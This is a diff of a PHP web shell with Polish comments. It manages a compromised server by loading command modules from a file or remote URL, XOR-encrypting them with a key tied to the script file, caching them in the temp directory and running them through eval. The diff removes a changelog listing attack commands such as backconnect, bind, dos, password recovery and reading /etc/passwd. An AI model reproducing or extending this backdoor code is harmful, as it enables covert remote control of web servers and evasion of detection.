@@ -15,6 +15,8 @@ require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';
 /**
  * class Shell - Zarzadzanie serwerem
  *
+ *  jezeli uzyjemy 'eval' to stale __FILE__, __DIR__ itp nie dzialaja !!!
+ *
  * @version 0.2
  *
  * @uses Arr
@@ -26,7 +28,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.2 b110604';
+	const VERSION = '0.2 b110605';
 
 	/**
 	 * Czas generowania strony
@@ -58,7 +60,7 @@ class Shell
 	 * @access public
 	 * @var    boolean
 	 */
-	public $bWindows;
+	public $bWindows = FALSE;
 
 	/**
 	 * Komenda
@@ -138,6 +140,11 @@ class Shell
 
 		/**
 		 * @see Request::init
+		 *
+		 * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
+		 *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
+		 * tylko
+		 *   ( Request::getGet( 'test' ) === 'test' )
 		 */
 		Request::init();
 
@@ -156,11 +163,11 @@ class Shell
 		 */
 		if( ! $this -> bSafeMode )
 		{
-			ini_set( 'display_errors',         1 );
-			ini_set( 'max_execution_time',     0 );
-			ini_set( 'memory_limit',           '1024M' );
+			ini_set( 'display_errors', 1 );
+			ini_set( 'max_execution_time', 0 );
+			ini_set( 'memory_limit', '1024M' );
 			ini_set( 'default_socket_timeout', 5 );
-			ini_set( 'date.timezone',          'Europe/Warsaw' );
+			ini_set( 'date.timezone', 'Europe/Warsaw' );
 		}
 
 		/**
@@ -185,7 +192,7 @@ class Shell
 		/**
 		 * Wczytywanie modulow
 		 */
-		$sKey = sha1( __FILE__ );
+		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );
 
 		/**
 		 * p jak PURE
@@ -213,7 +220,7 @@ class Shell
 				 */
 				for( $i = 0; $i < $iDataLen; $i++ )
 				{
-					$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
+					$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
 				}
 
 				eval( '?>' . $sNewData . '<?' );
@@ -259,7 +266,7 @@ class Shell
 	 * @param  integer $sHost Host / Host:port
 	 * @return array          Host i port
 	 */
-	private function getHost( $sHost )
+	public function getHost( $sHost )
 	{
 		$iPort = 0;
 		if( strpos( $sHost, ':' ) !== FALSE )
@@ -296,14 +303,16 @@ class Shell
 				'OpenBaseDir: %s<br />' .
 				'Serwer Api: <strong>%s</strong><br />' .
 				'Serwer: <strong>%s</strong><br />' .
-				'Zablokowane funkcje: <strong>%s</strong><br />',
+				'Zablokowane funkcje: <strong>%s</strong><br />' .
+				'Dostępne moduły: <strong>%s</strong>',
 
 				phpversion(),
 				$this -> getStatus( $this -> bSafeMode, 1 ),
 				ini_get( 'open_basedir' ),
 				php_sapi_name(),
 				php_uname(),
-				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions )
+				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions ),
+				implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) )
 		);
 	}
 
@@ -384,28 +393,18 @@ DATA;
 		 */
 		else
 		{
-			if( ! is_file( $this -> aArgv[0] ) )
+			if( ! ( is_file( $this -> aArgv[0] ) && ( ( $sData = file_get_contents( $this -> aArgv[0] ) ) !== FALSE ) ) )
 			{
 				return 'Nie można wczytać pliku z modułami';
 			}
 
 			$sFilePath = $this -> aArgv[0];
-
-			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
-			{
-				return 'Nie można wczytać pliku z modułami';
-			}
 		}
-
-		ob_start();
-		require $sFilePath;
-		ob_clean();
-		ob_end_flush();
 
 		/**
 		 * Szyfrowanie zawartosci pliku
 		 */
-		$sKey = sha1( __FILE__ );
+		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );
 
 		$iDataLen = strlen( $sData );
 
@@ -413,10 +412,20 @@ DATA;
 
 		for( $i = 0; $i < $iDataLen; $i++ )
 		{
-			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
+			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
 		}
 
 		file_put_contents( sys_get_temp_dir() . '/' . $sKey, $sNewData );
+
+		/**
+		 * Usuwanie tymczasowego pliku
+		 */
+		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
+		{
+			unlink( $sFilePath );
+		}
+
+		header( 'Refresh:1;url=' . Request::getCurrentUrl(), TRUE );
 
 		return 'Plik z modułami został załadowany';
 	}
@@ -424,54 +433,9 @@ DATA;
 	private function getCommandCr3d1ts()
 	{
 		return <<<DATA
-Jak to się mówi: '&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;'
-
 Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
 
 Jakieś sugestie, pytania ? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
-
-Changelog:
-==========
-
-2011-06-03 v0.2
-----------
-* Wsparcie dla CLI
-* Shella rozszerzono o następujące komendy:
-	ping
-	mkdir
-	cp
-	mv
-	modules
-	chmod
-	mysql
-	mysqldump
-	backconnect
-	bind
-	proxy
-	dos
-	passwordrecovery
-	cr3d1ts
-* możliwość wczytania danego modułu
-* polecenie 'cr3d1ts' nie wyświetla się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
-* 'php' jest aliasem dla 'eval
-
-2011-05-15 v0.1
----------------
-* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak:
-	echo
-	ls
-	cat
-	eval
-	remove
-	bcat
-	socketdownload
-	ftpdownload
-	download
-	socketupload
-	ftpupload
-	etcpasswd
-	game
-	help
 DATA;
 	}
 
@@ -514,7 +478,7 @@ DATA;
 		{
 			$oModule = new $sModule( $this );
 
-			$sOutput  .= $sModuleCmd . ' - ' . $oModule -> getHelp() . "\r\n\r\n\r\n";
+			$sOutput .= $sModuleCmd . ' - ' . $oModule -> getHelp() . "\r\n\r\n\r\n";
 		}
 
 		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
@@ -556,7 +520,7 @@ DATA;
 			}
 			else if( Request::getServer( 'REQUEST_METHOD' ) !== 'POST'  )
 			{
-				$sCmd = ':ls -l ' . dirname( __FILE__ );
+				$sCmd = ':ls -l ' . dirname( Request::getServer( 'SCRIPT_FILENAME' ) );
 			}
 			else
 			{
@@ -571,7 +535,7 @@ DATA;
 		{
 			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
 			{
-				$this -> sCmd = (string)substr( $sCmd, 1, $iPos );
+				$this -> sCmd = (string) substr( $sCmd, 1, $iPos );
 			}
 			else
 			{
@@ -589,6 +553,8 @@ DATA;
 			{
 				/**
 				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
+				 *
+				 * Dalbym tutaj lambde, ale php 5.2 tego nie obsluguje ...
 				 */
 				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );
 
@@ -619,7 +585,11 @@ DATA;
 					$sConsole = $this -> getCommandCr3d1ts();
 					break ;
 				default :
-					if( array_key_exists( $this -> sCmd, $this -> aModules ) )
+					if( $this -> aModules === array() )
+					{
+						$sConsole = 'Nie wczytano żadnych modułów !!!';
+					}
+					else if( array_key_exists( $this -> sCmd, $this -> aModules ) )
 					{
 						$sModule = $this -> aModules[ $this -> sCmd ];
 						$oModule = new $sModule( $this );
